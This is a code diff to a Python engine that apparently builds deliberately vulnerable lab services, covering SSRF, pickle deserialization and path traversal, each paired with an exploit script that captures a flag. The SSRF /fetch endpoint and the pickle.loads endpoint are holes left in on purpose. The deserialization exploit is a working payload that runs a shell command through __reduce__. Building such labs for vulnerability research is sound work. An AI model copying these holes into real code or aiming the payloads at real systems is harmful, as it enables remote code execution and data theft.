+                "    if FLAG_TOKEN in body:",
+                "        print(SUCCESS_SIGNATURE)",
+                "        print(FLAG_TOKEN)",
+                "        return 0",
+                "    print('Traversal payload did not reach protected file', file=sys.stderr)",
+                "    return 1",
+                "",
+                "if __name__ == '__main__':",
+                "    raise SystemExit(main())",
+                "",
+            ]
+        )
+        manifest = self._fallback_manifest_from_parts(
+            vuln_id=normalized_vuln or vuln_id,
+            stack=stack,
+            port=port,
+            notes=notes,
+            success_signature=success_signature,
+            flag_token=effective_flag,
+            requirements_content=requirements_content,
+            app_content=app_content,
+            poc_content=poc_content,
+        )
+        metadata = manifest.get("metadata") if isinstance(manifest.get("metadata"), dict) else {}
+        metadata["materializer"] = "minimal_dynamic"
+        manifest["metadata"] = metadata
+        return manifest
+
+    def _minimal_dynamic_manifest_ssrf(
+        self,
+        *,
+        vuln_id: str,
+        normalized_vuln: str,
+        stack: str,
+        port: int,
+        notes: str,
+        success_signature: str,
+        flag_token: str,
+    ) -> Dict[str, Any]:
+        effective_flag = flag_token or "FLAG{SSRF_OK}"
+        if self._fastapi_stack(stack):
+            app_content = "\n".join(
+                [
+                    "import requests",
+                    "from fastapi import FastAPI",
+                    "from fastapi.responses import JSONResponse, PlainTextResponse",
+                    "",
+                    "app = FastAPI()",
+                    f"FLAG_VALUE = {effective_flag!r}",
+                    "",
+                    "@app.get('/health')",
+                    "def health():",
+                    "    return {'status': 'ok'}",
+                    "",
+                    "@app.get('/metadata')",
+                    "def metadata():",
+                    "    return {'flag': FLAG_VALUE, 'service': 'metadata'}",
+                    "",
+                    "@app.get('/fetch')",
+                    "def fetch(url: str = 'http://127.0.0.1:8000/metadata'):",
+                    "    try:",
+                    "        response = requests.get(url, timeout=2)",
+                    "    except requests.RequestException as exc:",
+                    "        return JSONResponse({'error': str(exc)}, status_code=502)",
+                    "    return PlainTextResponse(",
+                    "        response.text,",
+                    "        status_code=response.status_code,",
+                    "        headers={'Content-Type': response.headers.get('Content-Type', 'text/plain')},",
+                    "    )",
+                    "",
+                    "if __name__ == '__main__':",
+                    "    import uvicorn",
+                    f"    uvicorn.run(app, host='0.0.0.0', port={port})",
+                    "",
+                ]
+            )
+            requirements_content = "fastapi==0.115.0\nuvicorn==0.30.6\nrequests==2.31.0\n"
+        else:
+            app_content = "\n".join(
+                [
+                    "import requests",
+                    "from flask import Flask, jsonify, request",
+                    "",
+                    "app = Flask(__name__)",
+                    f"FLAG_VALUE = {effective_flag!r}",
+                    "",
+                    "@app.get('/health')",
+                    "def health():",
+                    "    return jsonify({'status': 'ok'})",
+                    "",
+                    "@app.get('/metadata')",
+                    "def metadata():",
+                    "    return jsonify({'flag': FLAG_VALUE, 'service': 'metadata'})",
+                    "",
+                    "@app.get('/fetch')",
+                    "def fetch():",
+                    "    target_url = request.args.get('url', 'http://127.0.0.1:8000/metadata')",
+                    "    try:",
+                    "        response = requests.get(target_url, timeout=2)",
+                    "    except requests.RequestException as exc:",
+                    "        return jsonify({'error': str(exc)}), 502",
+                    "    return response.text, response.status_code, {'Content-Type': response.headers.get('Content-Type', 'text/plain')}",
+                    "",
+                    "if __name__ == '__main__':",
+                    f"    app.run(host='0.0.0.0', port={port})",
+                    "",
+                ]
+            )
+            requirements_content = "Flask==3.0.0\nrequests==2.31.0\n"
+        poc_content = "\n".join(
+            [
+                "import argparse",
+                "import json",
+                "import sys",
+                "from urllib.parse import quote",
+                "from urllib.request import Request, urlopen",
+                "",
+                f"SUCCESS_SIGNATURE = {success_signature!r}",
+                f"FLAG_TOKEN = {effective_flag!r}",
+                "DEFAULT_BASE = 'http://127.0.0.1:8000'",
+                "",
+                "def main() -> int:",
+                "    parser = argparse.ArgumentParser()",
+                "    parser.add_argument('--base-url', default=DEFAULT_BASE)",
+                "    args = parser.parse_args()",
+                "    target = args.base_url.rstrip('/') + '/metadata'",
+                "    url = args.base_url.rstrip('/') + '/fetch?url=' + quote(target, safe=':/?=&')",
+                "    request = Request(url, method='GET')",
+                "    try:",
+                "        with urlopen(request, timeout=5) as response:",
+                "            body = response.read().decode('utf-8', errors='ignore')",
+                "    except Exception as exc:",
+                "        print(f'SSRF request failed: {exc}', file=sys.stderr)",
+                "        return 1",
+                "    try:",
+                "        payload = json.loads(body)",
+                "    except json.JSONDecodeError:",
+                "        print('SSRF response body was not JSON', file=sys.stderr)",
+                "        return 1",
+                "    if str(payload.get('flag')) == FLAG_TOKEN:",
+                "        print(SUCCESS_SIGNATURE)",
+                "        print(FLAG_TOKEN)",
+                "        return 0",
+                "    print('Loopback fetch did not reach metadata endpoint', file=sys.stderr)",
+                "    return 1",
+                "",
+                "if __name__ == '__main__':",
+                "    raise SystemExit(main())",
+                "",
+            ]
+        )
+        manifest = self._fallback_manifest_from_parts(
+            vuln_id=normalized_vuln or vuln_id,
+            stack=stack,
+            port=port,
+            notes=notes,
+            success_signature=success_signature,
+            flag_token=effective_flag,
+            requirements_content=requirements_content,
+            app_content=app_content,
+            poc_content=poc_content,
+        )
+        metadata = manifest.get("metadata") if isinstance(manifest.get("metadata"), dict) else {}
+        metadata["materializer"] = "minimal_dynamic"
+        manifest["metadata"] = metadata
+        return manifest
+
+    def _minimal_dynamic_manifest_deserialization(
+        self,
+        *,
+        vuln_id: str,
+        normalized_vuln: str,
+        stack: str,
+        port: int,
+        notes: str,
+        success_signature: str,
+        flag_token: str,
+    ) -> Dict[str, Any]:
+        effective_flag = flag_token or "FLAG{DESER_OK}"
+        if self._fastapi_stack(stack):
+            app_content = "\n".join(
+                [
+                    "from pathlib import Path",
+                    "import pickle",
+                    "",
+                    "from fastapi import FastAPI, Request",
+                    "from fastapi.responses import JSONResponse",
+                    "",
+                    "app = FastAPI()",
+                    "FLAG_PATH = Path('/tmp/deser-flag.txt')",
+                    f"FLAG_VALUE = {effective_flag!r}",
+                    "",
+                    "@app.get('/health')",
+                    "def health():",
+                    "    return {'status': 'ok'}",
+                    "",
+                    "@app.post('/deserialize')",
+                    "async def deserialize_payload(request: Request):",
+                    "    payload = await request.body()",
+                    "    try:",
+                    "        result = pickle.loads(payload)",
+                    "    except Exception as exc:",
+                    "        return JSONResponse({'error': str(exc)}, status_code=400)",
+                    "    return {'result': str(result)}",
+                    "",
+                    "def init_runtime_state() -> None:",
+                    "    FLAG_PATH.write_text(FLAG_VALUE, encoding='utf-8')",
+                    "",
+                    "if __name__ == '__main__':",
+                    "    import uvicorn",
+                    "    init_runtime_state()",
+                    f"    uvicorn.run(app, host='0.0.0.0', port={port})",
+                    "",
+                ]
+            )
+            requirements_content = "fastapi==0.115.0\nuvicorn==0.30.6\n"
+        else:
+            app_content = "\n".join(
+                [
+                    "from pathlib import Path",
+                    "import pickle",
+                    "",
+                    "from flask import Flask, jsonify, request",
+                    "",
+                    "app = Flask(__name__)",
+                    "FLAG_PATH = Path('/tmp/deser-flag.txt')",
+                    f"FLAG_VALUE = {effective_flag!r}",
+                    "",
+                    "@app.get('/health')",
+                    "def health():",
+                    "    return jsonify({'status': 'ok'})",
+                    "",
+                    "@app.post('/deserialize')",
+                    "def deserialize_payload():",
+                    "    payload = request.get_data()",
+                    "    try:",
+                    "        result = pickle.loads(payload)",
+                    "    except Exception as exc:",
+                    "        return jsonify({'error': str(exc)}), 400",
+                    "    return jsonify({'result': str(result)})",
+                    "",
+                    "def init_runtime_state() -> None:",
+                    "    FLAG_PATH.write_text(FLAG_VALUE, encoding='utf-8')",
+                    "",
+                    "if __name__ == '__main__':",
+                    "    init_runtime_state()",
+                    f"    app.run(host='0.0.0.0', port={port})",
+                    "",
+                ]
+            )
+            requirements_content = "Flask==3.0.0\n"
+        poc_content = "\n".join(
+            [
+                "import argparse",
+                "import json",
+                "import pickle",
+                "import sys",
+                "from urllib.request import Request, urlopen",
+                "",
+                f"SUCCESS_SIGNATURE = {success_signature!r}",
+                f"FLAG_TOKEN = {effective_flag!r}",
+                "",
+                "class Exploit:",
+                "    def __reduce__(self):",
+                "        import subprocess",
+                "        return (subprocess.getoutput, ('cat /tmp/deser-flag.txt',))",
+                "",
+                "def main() -> int:",
+                "    parser = argparse.ArgumentParser()",
+                "    parser.add_argument('--base-url', default='http://127.0.0.1:8000')",
+                "    args = parser.parse_args()",
+                "    target = args.base_url.rstrip('/') + '/deserialize'",
+                "    payload = pickle.dumps(Exploit(), protocol=pickle.HIGHEST_PROTOCOL)",
+                "    request = Request(target, data=payload, method='POST')",
+                "    request.add_header('Content-Type', 'application/octet-stream')",
+                "    try:",
+                "        with urlopen(request, timeout=5) as response:",
+                "            body = response.read().decode('utf-8', errors='ignore')",
+                "    except Exception as exc:",
+                "        print(f'Deserialization request failed: {exc}', file=sys.stderr)",
+                "        return 1",
+                "    try:",
+                "        data = json.loads(body)",
+                "    except json.JSONDecodeError:",
+                "        print('Deserialization response body was not JSON', file=sys.stderr)",
+                "        return 1",
+                "    if str(data.get('result')) == FLAG_TOKEN:",
+                "        print(SUCCESS_SIGNATURE)",
+                "        print(FLAG_TOKEN)",
+                "        return 0",
+                "    print('Deserialization payload did not reach protected sink', file=sys.stderr)",
+                "    return 1",
+                "",
+                "if __name__ == '__main__':",
+                "    raise SystemExit(main())",
+                "",
+            ]
+        )
+        manifest = self._fallback_manifest_from_parts(
+            vuln_id=normalized_vuln or vuln_id,
+            stack=stack,
+            port=port,
+            notes=notes,
+            success_signature=success_signature,
+            flag_token=effective_flag,
+            requirements_content=requirements_content,
+            app_content=app_content,
+            poc_content=poc_content,
+        )
+        metadata = manifest.get("metadata") if isinstance(manifest.get("metadata"), dict) else {}
+        metadata["materializer"] = "minimal_dynamic"
+        manifest["metadata"] = metadata
+        return manifest
+
+    def _fallback_stack_id(self) -> str:
+        requirement = self._requirement if isinstance(self._requirement, dict) else {}
+        runtime_recipe = requirement.get("runtime_recipe") if isinstance(requirement.get("runtime_recipe"), dict) else {}
+        language = str(runtime_recipe.get("language") or requirement.get("language") or "").strip().lower()
+        framework = str(runtime_recipe.get("framework") or requirement.get("framework") or "").strip().lower()
+        if language and framework:
+            return f"{language}/{framework}"
+        tech_stack_candidates = (
+            self._researcher_report_payload.get("tech_stack_candidates")
+            if isinstance(self._researcher_report_payload, dict)
+            else []
+        )
+        if isinstance(tech_stack_candidates, list):
+            for entry in tech_stack_candidates:
+                if not isinstance(entry, dict):
+                    continue
+                cand_language = str(entry.get("language") or "").strip().lower()
+                cand_framework = str(entry.get("framework") or "").strip().lower()
+                if cand_language and cand_framework:
+                    return f"{cand_language}/{cand_framework}"
+        stack_hypotheses = requirement.get("stack_hypotheses") if isinstance(requirement.get("stack_hypotheses"), list) else []
+        if isinstance(stack_hypotheses, list):
+            for entry in stack_hypotheses:
+                if not isinstance(entry, dict):
+                    continue
+                cand_language = str(entry.get("language") or "").strip().lower()
+                cand_framework = str(entry.get("framework") or "").strip().lower()
+                if cand_language and cand_framework:
+                    return f"{cand_language}/{cand_framework}"
+        return "python/flask"
+
+    @staticmethod
+    def _fastapi_stack(stack: str) -> bool:
+        return str(stack or "").strip().lower().endswith("/fastapi")
+
+    def _allow_family_aware_fallback(self) -> bool:
+        requirement = self._requirement if isinstance(self._requirement, dict) else {}
+        vuln_id = str(requirement.get("vuln_id") or "").strip()
+        if not vuln_id:
+            return False
+        if self._is_name_driven_requirement() and self._name_only_mode() == "strict_dynamic":
+            return False
+        if vuln_id.upper().startswith("NAME-"):
+            policy = requirement.get("policy") if isinstance(requirement.get("policy"), dict) else {}
+            if not bool(policy.get("allow_name_family_fallback")):
+                return False
+        return bool(family_canonical_tags(vuln_id))
 
     def _is_sqli_family(self) -> bool:
         vuln = normalize_vuln_id(str((self._requirement or {}).get("vuln_id") or ""))
@@ -1083,10 +2152,13 @@ class SynthesisEngine:
         )
         readme_content = self._render_fallback_asset(
             "fallback_bundle_readme.md.tmpl",
-            {
-                "__VULN_ID__": vuln_id,
-                "__PORT__": str(port),
-            },
+            self._fallback_readme_context(
+                vuln_id=vuln_id,
+                port=port,
+                service_path=service_path,
+                success_signature=success_signature,
+                flag_token=flag_token,
+            ),
         )
         files: List[Dict[str, Any]] = [
             {
@@ -2169,6 +3241,8 @@ class SynthesisEngine:
             "family_override_applied": selected.family_override_applied,
             "llm_stub_used": selected.llm_stub_used,
             "llm_fixture_used": selected.llm_fixture_used,
+            "llm_provider_attempted": selected.llm_provider_attempted,
+            "llm_provider_succeeded": selected.llm_provider_succeeded,
             "llm_failure_class": selected.llm_failure_class,
             "llm_failure_message": selected.llm_failure_message,
             "provenance": {
@@ -2178,6 +3252,8 @@ class SynthesisEngine:
                 "family_override_applied": selected.family_override_applied,
                 "llm_stub_used": selected.llm_stub_used,
                 "llm_fixture_used": selected.llm_fixture_used,
+                "llm_provider_attempted": selected.llm_provider_attempted,
+                "llm_provider_succeeded": selected.llm_provider_succeeded,
             },
         }
         manifest_path.write_text(json.dumps(manifest_payload, indent=2, ensure_ascii=False), encoding="utf-8")
@@ -2198,6 +3274,8 @@ class SynthesisEngine:
         autofix_trace: List[Dict[str, Any]] = []
         llm_stub_used = False
         llm_fixture_used = False
+        llm_provider_attempted = False
+        llm_provider_succeeded = False
         fallback_used = False
         fallback_class = ""
         family_override_applied = False
@@ -2223,6 +3301,8 @@ class SynthesisEngine:
                 autofix_trace.extend(trace_entries)
             llm_stub_used = llm_stub_used or bool(report.llm_stub_used)
             llm_fixture_used = llm_fixture_used or bool(report.llm_fixture_used)
+            llm_provider_attempted = llm_provider_attempted or bool(report.llm_provider_attempted)
+            llm_provider_succeeded = llm_provider_succeeded or bool(report.llm_provider_succeeded)
             fallback_used = fallback_used or bool(report.fallback_used)
             if not fallback_class and isinstance(report.fallback_class, str) and report.fallback_class.strip():
                 fallback_class = report.fallback_class.strip()
@@ -2389,6 +3469,8 @@ class SynthesisEngine:
             "autofix_trace": autofix_trace,
             "llm_stub_used": llm_stub_used,
             "llm_fixture_used": llm_fixture_used,
+            "llm_provider_attempted": llm_provider_attempted,
+            "llm_provider_succeeded": llm_provider_succeeded,
             "fallback_used": fallback_used,
             "fallback_class": fallback_class or None,
             "family_override_applied": family_override_applied,
